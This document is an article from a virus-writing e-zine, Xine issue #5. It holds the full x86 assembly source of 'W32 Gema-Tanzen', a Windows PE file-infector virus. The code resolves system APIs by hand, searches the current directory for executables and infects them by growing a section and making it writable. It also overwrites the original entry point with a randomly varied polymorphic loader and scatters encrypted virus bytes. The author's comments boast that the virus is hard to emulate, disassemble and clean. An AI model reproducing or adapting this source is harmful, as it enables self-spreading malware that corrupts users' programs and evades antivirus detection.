
   ;                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                                             ³ Xine - issue #5 - Phile 211 ³
   ;                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ






   ;----------------------------  W32 GEMA-TANZEN BY HenKy -----------------------------
   ;
   ;-AUTHOR:        HenKy
   ;
   ;-MAIL:          HenKy_@latinmail.com
   ;
   ;-ORIGIN:        SPAIN
   ;
   ;-TODO:          30/10/00 - 7/10/00
   ;
   ;                NOT FULLY POLYMORPHIC... ANOTHER UNFINISHED POLY... WAIT MY META X/
   ;                DO NOT MODIFY ORIGINAL EIP (EPO)
   ;                NEED NEW ALGORITHM TO CLEAN (AVERS WILL HATE IT)
   ;                IS NOT ENCRYPTED (CRYPTANALISYS SUX)
   ;                HARD TO EMULATE
   ;                QUITE STABLE (AT LEAST IN MY TESTS) IN W32
   ;                HARD TO DISASM (SURE ? XDDD )
   ;                ONLY RUNTIME CURRENT DIR (IM LIMITED TO STACK SIZE)

   .586P
   .MODEL FLAT
   LOCALS


   EXTRN       ExitProcess:PROC

   MIX_SIZ     EQU FILE_END-MEGAMIX
   MIX_MEM     EQU MEM_END-MEGAMIX
   NABLA       EQU DELTA-MEGAMIX
   MARKA       EQU 66
   FLAGZ       EQU 00000020H OR 20000000H OR 80000000H
   MAX_PATH    EQU 260

   MACROSIZE   MACRO

               DB      MIX_SIZ/01000 mod 10 + "0"
               DB      MIX_SIZ/00100 mod 10 + "0"
               DB      MIX_SIZ/00010 mod 10 + "0"
               DB      MIX_SIZ/00001 mod 10 + "0"

               ENDM

   .DATA

           DB 'MY BEST VIRUS SO FAR... GEMA TANZEN SO FAR !!!   '
           DB 'GREETZ TO VX-OBSCENE...'

   .CODE

   FAKE:
           CALL    DELTA2
   DELTA2: POP     EBP
           SUB     ESP,MIX_MEM
           MOV     ECX,MIX_MEM
           LEA     ESI,[EBP+MEGAMIX-DELTA2]
           MOV     EDI,ESP
           REP     MOVSB
           JMP     ESP

   MEGAMIX:

           MOV     EAX, [ESP+MIX_MEM]
           CALL    DELTA
   DELTA:
           XOR     AX, AX

   F_BASE:
           CMP     BYTE PTR [EAX], "M"
           JE      FLAGO
           SUB     EAX, 1000H
           JMP     F_BASE

           DB      'GEMA TANZEN SO FAR!'

    FLAGO:
           MOV     EBX, [EAX+3Ch]
           ADD     EBX, EAX
           MOV     EBX, [EBX+120]
           ADD     EBX, EAX          ; BEST METHOD :P
           MOV     ESI, [EBX+(3*4)]
           ADD     ESI, EAX
           MOV     EDX, [EBX+(8*4)]
           ADD     EDX, EAX
           MOV     ECX, [EBX+(6*4)]
           DEC     ECX
           POP     EBP

   FIND_GPA:

           MOV     EDI, [EDX+(ECX*4)]
           ADD     EDI, EAX
           PUSHAD
           CALL    GAP
           DB      "GetProcAddress",0
   GAP:
           POP     ESI
           PUSH    15
           POP     ECX
           REPE    CMPSB
           POPAD
           JNE     LOOP_FGPA

           MOV     ESI, [EBX+(9*4)]
           ADD     ESI, EAX
           MOVZX   ESI, WORD PTR [ESI+(ECX*2)]
           MOV     EBX, [EBX+(7*4)]
           ADD     EBX, EAX
           LEA     EBX, [EBX+(ESI*4)]
           MOV     ESI, [EBX]
           ADD     ESI, EAX
           MOV     [EBP+GPA-DELTA], ESI

   LOOP_FGPA:

           LOOP    FIND_GPA
           XCHG    EBX, EAX
           LEA     ESI, [EBP+APIs-DELTA]
           LEA     EDI, [EBP+APIaddresses-DELTA]

   GPI:    PUSH    ESI
           PUSH    EBX
           CALL    [EBP+GPA-DELTA]
           CLD
           STOSD

    NPI:
           LODSB
           OR      AL, AL
           JNZ     SHORT NPI
           CMP     [ESI], AL
           JNZ     GPI

   INFECT:

           LEA     EAX, [EBP+OFFSET Win32FindData-DELTA]
           PUSH    EAX
           LEA     EAX, [EBP+OFFSET IMASK-DELTA]
           PUSH    EAX
           CALL    DWORD PTR [EBP+FindFirstFile-DELTA]
           MOV     DWORD PTR [EBP+SearcHandle-DELTA],EAX


   LOOPER:
           INC     EAX
           JZ      WARNING
           DEC     EAX
           OR      EAX,EAX
           JNZ     ALLKEY

   WARNING:

           MOV     EAX,00001000H
           OLD_EIP EQU $-4
           ADD     EAX,00400000H
           BASE    EQU $-4
           PUSH    EAX

           MOV     EDI,[EBP+BASE-DELTA]
           ADD     EDI,[EBP+OLD_EIP-DELTA]
           LEA     ESI,[EBP+SALVANTE-DELTA]
           MOV     ECX,CARGADOR_SIZ
           REP     MOVSB

   INTERPRETE:

           MOV     EDX,[EBP+LASTO-DELTA]
           MOV     ECX,MIX_SIZ/4
    PAZZ:

           ROL     BYTE PTR [EDX+(4*MIX_SIZ)],12H
           DKEY4   EQU $-1
           ADD     DWORD PTR [EDX+(4*MIX_SIZ)],12345678H
           DKEY3   EQU $-4
           ROR     BYTE PTR [EDX+(4*MIX_SIZ)],12H
           DKEY2   EQU $-1
           XOR     DWORD PTR [EDX+(4*MIX_SIZ)],12345678H
           DKEY1   EQU $-4
           ADD     EDX,4
           LOOP    PAZZ

   GODAMM_BUG:

           MOV     EDX,12345678H
           LASTO   EQU $-4
           MOV     ECX,MIX_SIZ
           MOV     ESI,EDX
           ADD     ESI,(4*MIX_SIZ)

   ZENTRAL:

           MOV     EDI,[EDX]
           ADD     EDX,4
           MOVSB
           LOOP    ZENTRAL

   ESTO_ES_CUTRE_BASTARDO:

           POP     EAX
           ADD     ESP,MIX_MEM
           JMP     EAX

   ALLKEY:

           PUSH    CARGADOR_SIZ
       XOR     ECX,ECX
           PUSH    ECX
           CALL    DWORD PTR [EBP+GlobalAlloc-DELTA]
       PUSH    EAX

           LEA     ESI,[EBP+SALVANTE-DELTA]
           MOV     ECX,CARGADOR_SIZ
           MOV     EDI,EAX
           REP     MOVSB

           PUSH    DWORD PTR [EBP+OLD_EIP-DELTA]
           PUSH    DWORD PTR [EBP+BASE-DELTA]
           PUSH    DWORD PTR [EBP+LASTO-DELTA]
           PUSH    DWORD PTR [EBP+DKEY1-DELTA]
           PUSH    DWORD PTR [EBP+DKEY2-DELTA]
           PUSH    DWORD PTR [EBP+DKEY3-DELTA]
           PUSH    DWORD PTR [EBP+DKEY4-DELTA]
           CDQ
           PUSH    EDX
           PUSH    80h
           PUSH    3
           PUSH    EDX
           PUSH    EDX
           PUSH    0C0000000h
           LEA     EAX ,[EBP+offset FNAME-DELTA]        ; OPEN IT!
           PUSH    EAX
           CALL    DWORD PTR [EBP+CreateFile-DELTA]

           INC     EAX
           JZ      Cerrar
           DEC     EAX

           MOV     DWORD PTR [EBP+FileHandle-DELTA],EAX  ; SAVE HNDL
           MOV     ECX, DWORD PTR [EBP+WFD_nFileSizeLow-DELTA]
           CMP     ECX,(50*1024)
           JB      Cerrar
           CALL    CreateMap                       ; CREATE A MAP

           MOV     DWORD PTR [EBP+MapHandle-DELTA],EAX
           MOV     ECX, DWORD PTR [EBP+WFD_nFileSizeLow-DELTA]
           CALL    MapFile                         ; MEMORY PROYECTION

           MOV     DWORD PTR [EBP+MapAddress-DELTA],EAX
           MOV     ESI,EAX                         ; GET PE HDR
           MOV     ESI,[EAX+3CH]
           ADD     ESI,EAX
           CMP     BYTE PTR [ESI],"P"            ; IS A 'P'E ?
           JNZ     Cerrar
           CMP     BYTE PTR [ESI+MARKA],"H"     ; HenKy IS HERE ?
           JZ      Cerrar

           PUSHAD
           MOV     EBX,[ESI+74H]
           SHL     EBX,3           ; MAKE FIRST SECTION WRITEABLE
           ADD     ESI,78H
           ADD     ESI,EBX
           OR      DWORD PTR [ESI+24H],FLAGZ
           MOV     EAX,DWORD PTR [ESI+8]
           MOV     [EBP+SEC_SIZ-DELTA],EAX
           MOV     EAX,[ESI+12] ; RVA
           MOV     [EBP+SEC_EIP-DELTA],EAX
           MOV     ECX,[ESI+20]
           MOV     EAX,[ESI+12]
           SUB     EAX,ECX
           MOV     DWORD PTR [EBP+SUBBER-DELTA],EAX
           POPAD

           PUSH    DWORD PTR [ESI+3CH]
           PUSH    DWORD PTR [EBP+MapAddress-DELTA]      ; CLOSE
           CALL    DWORD PTR [EBP+UnmapViewOfFile-DELTA]
           PUSH    DWORD PTR [EBP+MapHandle-DELTA]
           CALL    DWORD PTR[EBP+CloseHandle-DELTA]
           POP     ECX
           MOV     EAX,DWORD PTR [EBP+WFD_nFileSizeLow-DELTA] ; MAP AGAIN  WIHT VIRSIZE
           ADD     EAX,(MIX_SIZ*5)

           CALL    Align

           XCHG    ECX,EAX
           MOV     DWORD PTR [EBP+NewSize-DELTA],ECX
           CALL    CreateMap

           MOV     DWORD PTR [EBP+MapHandle-DELTA],EAX
           MOV     ECX,DWORD PTR [EBP+NewSize-DELTA]
           CALL    MapFile

           MOV     DWORD PTR [EBP+MapAddress-DELTA],EAX     ; AGAIN
           MOV     ESI,[EAX+3CH]
           ADD     ESI,EAX
           MOV     EDI,ESI
           MOVZX   EAX,WORD PTR [EDI+06H]
           DEC     EAX
           IMUL    EAX,EAX,28H
           ADD     ESI,EAX
           ADD     ESI,78H
           MOV     EDX,[EDI+74H]
           SHL     EDX,3
           ADD     ESI,EDX

           MOV     ECX,[EDI+3CH]
           MOV     EBX,[EDI+56]
           CMP     ECX,EBX
           JNZ     NIXX
           CDQ
           MOV     [EBP+SUBBER-DELTA],EDX
   NIXX:
           MOV     EAX,[EDI+28H]
           MOV     DWORD PTR [EBP+OLD_EIP-DELTA],EAX   ;SAVE OLD EIP
           SUB     DWORD PTR [EBP+SEC_SIZ-DELTA],EAX
           MOV     EDX,[ESI+10H]
           MOV     EBX,EDX
           ADD     EDX,[ESI+14H]
           PUSH    EDX
           MOV     EAX,EBX
           ADD     EAX,[ESI+0CH]
           ADD     EAX,[EDI+34H]
           MOV     [EBP+LASTO-DELTA],EAX
           MOV     [EBP+LASTO2-DELTA],EAX
           MOV     EAX,[EDI+34H]     ; IMAGE BASE
           MOV     [EBP+BASE-DELTA],EAX
           MOV     EAX,[ESI+10H]
           ADD     EAX,(5*MIX_SIZ)
           MOV     ECX,[EDI+3CH]

           CALL    Align

           MOV     [ESI+10H],EAX   ;NEW PHYSSIZE
           MOV     [ESI+08H],EAX   ;NEW VIRTSIZE
           POP     EDX
           MOV     EAX,[ESI+10H]
           ADD     EAX,[ESI+0CH]
           MOV     [EDI+50H],EAX   ; NEW IMAGESIZE
           OR      DWORD PTR [ESI+24H],FLAGZ
           MOV     BYTE PTR [EDI+MARKA],"H" ;  HenKy!
           ADD     EDX,DWORD PTR [EBP+MapAddress-DELTA]
           MOV     EBX,[EBP+OLD_EIP-DELTA]
           ADD     EBX,[EBP+MapAddress-DELTA]
           SUB     EBX,12345678H
           SUBBER  EQU $-4

           PUSHAD
           MOV     ESI,[EDI+28H]       ; SAVE OLD DATA
           ADD     ESI,DWORD PTR [EBP+MapAddress-DELTA]
           SUB     ESI,[EBP+SUBBER-DELTA]
           LEA     EDI,[EBP+SALVANTE-DELTA]
           PUSH    CARGADOR_SIZ
           POP     ECX
           REP     MOVSB
           POPAD

   ;TINY POLYMORPHIC GENERATOR

           PUSHAD
           LEA     EDI,[EBP+CARGADOR-DELTA]
           MOV     EAX,2
           CALL    PRANDOM32
           CMP     AL,1
           JNE     CHINCHETA1
           MOV     EAX,0EC81H
           STOSW
           MOV     EAX,MIX_MEM
           STOSD
           JMP     NEXT2
   CHINCHETA1:
           MOV     EAX,0C481H
           STOSW
           MOV     EAX,-MIX_MEM
           STOSD

   NEXT2:  MOV     EAX,2
           CALL    PRANDOM32
           CMP     AL,1
           JNE     PROTESIS_RARA
           MOV     EAX,0FC8BH
           STOSW
           JMP     NEXT3

   PROTESIS_RARA:

           MOV     EAX,05F54H
           STOSW
   NEXT3:

           MOV     EAX,2
           CALL    PRANDOM32
           CMP     AL,1
           JNE     BOMBAS_BOMBAS
           MOV     AL,0BBH
           STOSB
           MOV     EAX,[EBP+LASTO-DELTA]
           STOSD
           JMP     NEXT4

   BOMBAS_BOMBAS:

           MOV     AL,'h'
           STOSB
           MOV     EAX,[EBP+LASTO-DELTA]
           STOSD
           MOV     AL,05BH
           STOSB

   NEXT4:
           MOV     EAX,2
           CALL    PRANDOM32
           CMP     AL,1
           JNE     BUZEFALO
           MOV     AL,0B9H
           STOSB
           MOV     EAX,MIX_SIZ
           STOSD
           JMP     NEXT5
   BUZEFALO:
           MOV     AL,'h'
           STOSB
           MOV     EAX,MIX_SIZ
           STOSD
           MOV     AL,059H
           STOSB

   NEXT5:  MOV     EAX,2
           CALL    PRANDOM32
           CMP     AL,1
           JNE     ESTO_ES_ABURRIDO
           MOV     AL,90H
           STOSB
           MOV     EAX,0338BH
           STOSW
           JMP     NEXT6

   ESTO_ES_ABURRIDO:

           MOV     EAX,0338BH
           STOSW
           MOV     AL,90H
           STOSB
   NEXT6:
           MOV     EAX,2
           CALL    PRANDOM32
           CMP     AL,1
           JNE     CAIMAN
           MOV     EAX,0C383H
           STOSW
           MOV     AL,04H
           STOSB
           JMP     NEXT7

   CAIMAN:
           MOV     EAX,0EB83H
           STOSW
           MOV     AL,0FCH
           STOSB
   NEXT7:

           MOV     EAX,2
           CALL    PRANDOM32
           CMP     AL,1
           JNE     BABOSERA
           MOV     EAX,090A4H
           STOSW
           JMP     NEXT8

   BABOSERA:
           MOV     EAX,0AAACH
           STOSW
   NEXT8:
           MOV     EAX,2
           CALL    PRANDOM32
           CMP     AL,1
           JNE     BABOSERAR
           MOV     EAX,0F6E2H
           STOSW
           JMP     NEXT9

   BABOSERAR:
           MOV     EAX,0F6E0H
           STOSW
   NEXT9:
           MOV     EAX,2
           CALL    PRANDOM32
           CMP     AL,1
           JNE     BABOSERARR
           MOV     EAX,0E4FFH
           STOSW
           JMP     NEXT10

   BABOSERARR:
           MOV     EAX,0C354H
           STOSW
   NEXT10:
           POPAD

           PUSHAD
           MOV     EDI,[EDI+28H]       ; WRITE NEW DATA
           ADD     EDI,DWORD PTR [EBP+MapAddress-DELTA]
           SUB     EDI,[EBP+SUBBER-DELTA]
           CALL    SMART1

   ; POLYMORPHIC LOADER

   CARGADOR:

           SUB      ESP,MIX_MEM
           MOV      EDI,ESP
           MOV      EBX,12345678H
           MOV      ECX,MIX_SIZ

   TECHNICS:
           NOP
           MOV      ESI,[EBX]
           ADD      EBX,4
           MOVSB
           NOP
           NOP
           LOOP     TECHNICS
           JMP      ESP
           NOP
           NOP
           NOP

   CARGADOR_SIZ EQU $-CARGADOR

   SMART1:
           POP     ESI
           PUSH    CARGADOR_SIZ
           POP     ECX
           REP     MOVSB
           POPAD

           PUSHAD
           CALL    RANDOM32
           MOV     [EBP+CKEY1-DELTA],EAX
           MOV     [EBP+DKEY1-DELTA],EAX
           CALL    RANDOM32
           MOV     [EBP+CKEY2-DELTA],AL
           MOV     [EBP+DKEY2-DELTA],AL
           CALL    RANDOM32
           MOV     [EBP+CKEY3-DELTA],EAX
           MOV     [EBP+DKEY3-DELTA],EAX
           CALL    RANDOM32
           MOV     [EBP+CKEY4-DELTA],AL
           MOV     [EBP+DKEY4-DELTA],AL
           POPAD

           ;EDX:INCREASED L.SEC   EBX:FIRST SECTION

      ;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/////////////////////////////////////;
      ;                                                                        ;
      ;                     ETERNAL MACHINE V (C) HenKy                        ;
      ;                                                                        ;
      ;///////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\;

   GEMA_TANZEN_ENGINE_START:

           PUSHAD
           MOV     EDI,EDX
           MOV     ECX,MIX_SIZ
           JMP     PRADO

   OROCHI  DB     'EternaL MachinE V'   ;LONG AWAITED... :)

   PARDO:  POP     ECX

   PRADO:
           MOV     EAX,12345678H
           SEC_SIZ EQU $-4
           CALL    PRANDOM32
           ADD     EAX,12345678H
           SEC_EIP EQU $-4
           MOV     EBX,[EBP+OLD_EIP-DELTA]
           PUSH    ECX
           MOV     ECX,CARGADOR_SIZ

   PODRIDO:
           CMP     EBX,EAX
           JE      PARDO
           INC     EBX
           LOOP    PODRIDO
           POP     ECX

           ADD     EAX,[EBP+BASE-DELTA]
           PUSHAD
           MOV     EDI,EDX
           MOV     ECX,MIX_SIZ
   ZERZENA:
           CMP     DWORD PTR [EDI],EAX
           JE      OTROX
           ADD     EDI,4
           LOOP    ZERZENA
           JMP     GOOZ
   OTROX:  POPAD
           JMP     PRADO
   GOOZ:
           POPAD
           STOSD
           LOOP    PRADO


   MEC_MEC:

           MOV     EDI,EDX
           MOV     ESI,EDX
           ADD     EDI,(MIX_SIZ*4)
           MOV     ECX,MIX_SIZ

   PINTXO:
           LODSD
           PUSH    ESI
           SUB     EAX,[EBP+BASE-DELTA]
           ADD     EAX,[EBP+MapAddress-DELTA]
           SUB     EAX,[EBP+SUBBER-DELTA]
           MOV     ESI,EAX
           MOVSB
           POP     ESI
           LOOP    PINTXO


   MAC_MAC:


           MOV     ECX,MIX_SIZ
           LEA     ESI,[EBP+MEGAMIX-DELTA]

   PACO_ANN:

           MOV     EDI,[EDX]
           ADD     EDX,4
           SUB     EDI,[EBP+BASE-DELTA]
           ADD     EDI,[EBP+MapAddress-DELTA]
           SUB     EDI,[EBP+SUBBER-DELTA]
           MOVSB
           LOOP    PACO_ANN
           POPAD
           MOV     ECX,MIX_SIZ/4

      PASS:
           XOR     DWORD PTR [EDX+(4*MIX_SIZ)],12345678H
           CKEY1   EQU $-4
           ROL     BYTE PTR [EDX+(4*MIX_SIZ)],12H
           CKEY2   EQU $-1
           SUB     DWORD PTR [EDX+(4*MIX_SIZ)],12345678H
           CKEY3   EQU $-4
           ROR     BYTE PTR [EDX+(4*MIX_SIZ)],12H
           CKEY4   EQU $-1
           ADD     EDX,4
           LOOP    PASS

   UnMapFile:

           PUSH    DWORD PTR [EBP+MapAddress-DELTA]
           CALL    DWORD PTR [EBP+UnmapViewOfFile-DELTA]

   CloseMap:

           PUSH    DWORD PTR [EBP+MapHandle-DELTA]
           CALL    DWORD PTR [EBP+CloseHandle-DELTA]

   Cerrar:

           POP     DWORD PTR [EBP+DKEY4-DELTA]
           POP     DWORD PTR [EBP+DKEY3-DELTA]
           POP     DWORD PTR [EBP+DKEY2-DELTA]
           POP     DWORD PTR [EBP+DKEY1-DELTA]
           POP     DWORD PTR [EBP+LASTO-DELTA]
           POP     DWORD PTR [EBP+BASE-DELTA]
           POP     DWORD PTR [EBP+OLD_EIP-DELTA]
           POP     EAX
           MOV     ESI,EAX
           MOV     ECX,CARGADOR_SIZ
           LEA     EDI,[EBP+SALVANTE-DELTA]
           REP     MOVSB

           PUSH    EAX
           CALL    DWORD PTR [EBP+GlobalFree-DELTA]

           PUSH    DWORD PTR [EBP+FileHandle-DELTA]
           CALL    DWORD PTR [EBP+CloseHandle-DELTA]

   TOPO:


           LEA     EAX, [EBP+offset Win32FindData-DELTA]
           PUSH    EAX
           PUSH    DWORD PTR [EBP+SearcHandle-DELTA]
           CALL    DWORD PTR [EBP+FindNextFile-DELTA]
           JMP     LOOPER


   CreateMap:

           CDQ
           PUSH    EDX
           PUSH    ECX
           PUSH    EDX
           PUSH    4H
           PUSH    EDX
           PUSH    DWORD PTR [EBP+FileHandle-DELTA]
           CALL    DWORD PTR [EBP+CreateFileMappingA-DELTA]
           RET


   MapFile:

           CDQ
           PUSH    ECX
           PUSH    EDX
           PUSH    EDX
           INC     EDX
           INC     EDX
           PUSH    EDX
           PUSH    DWORD PTR [EBP+MapHandle-DELTA]
           CALL    DWORD PTR [EBP+MapViewOfFile-DELTA]
           RET

   Align:
           PUSH    EDX
           CDQ
           PUSH    EAX
           DIV     ECX
           POP     EAX
           SUB     ECX,EDX
           ADD     EAX,ECX
           POP     EDX
           RET

   RANDOM32:

           PUSH EDX
           DB 0FH, 31H
           POP EDX
           RET

   PRANDOM32:

           PUSH    EDX
           PUSH    ECX
           XOR     EDX,EDX
           PUSH    EAX
           CALL    RANDOM32
           POP     ECX
           DIV     ECX
           XCHG    EAX, EDX
           POP     ECX
           POP     EDX
           RET

   LASTO2  DD 0

   APIs:
           DB      "CreateFileA",0
           DB      "CloseHandle",0
           DB      "FindFirstFileA",0
           DB      "FindNextFileA",0

      ; ONLY 7 APIZ TO MAKE A VIRII...

           DB      "MapViewOfFile",0

       ; AS USUAL...

           DB      "UnmapViewOfFile",0

        ; WINDOZE SUCKS! 8-D

           DB      "CreateFileMappingA",0

           DB      "GlobalAlloc",0   ; SHIT!!! 2 APIS MORE
           DB      "GlobalFree",0    ; DUE WEIRD STACK BUG :O
   Zero_   DB        0

   SALVANTE DB CARGADOR_SIZ DUP (0CCH)

   IMASK   DB '*.ZZZ',0 ; FOR DEBUGZZZZ

           DB 'GEMA-TANZEN VIRUS CODED BY OROCHI HenKy',0


   ALIGN 4

   FILE_END               LABEL BYTE

   APIaddresses:

   CreateFile          DD 0
   CloseHandle         DD 0
   FindFirstFile       DD 0
   FindNextFile        DD 0
   MapViewOfFile       DD 0
   UnmapViewOfFile     DD 0
   CreateFileMappingA  DD 0
   GlobalAlloc         DD 0
   GlobalFree          DD 0
   GPA                 DD 0
   SearcHandle         DD 0
   FileHandle          DD 0
   NewSize             DD 0
   MapHandle           DD 0
   MapAddress          DD 0

   FILETIME            STRUC

   FT_dwLowDateTime    DD ?
   FT_dwHighDateTime   DD ?

   FILETIME            ENDS

   Win32FindData:

   WFD_dwFileAttributes    DD ?
   WFD_ftCreationTime      FILETIME ?
   WFD_ftLastAccessTime    FILETIME ?
   WFD_ftLastWriteTime     FILETIME ?
   WFD_nFileSizeHigh       DD ?
   WFD_nFileSizeLow        DD ?
   WFD_dwReserved0         DD ?
   WFD_dwReserved1         DD ?
   FNAME                   DB MAX_PATH DUP (?)
   WFD_szAlternateFileName DB 13 DUP (?)
                           DB 03 DUP (?)
                           DB 100h dup (0)
   ALIGN 4

   MEM_END                LABEL BYTE

   EXITPROC:
                          PUSH 0
                          CALL ExitProcess
   ENDS
   END FAKE
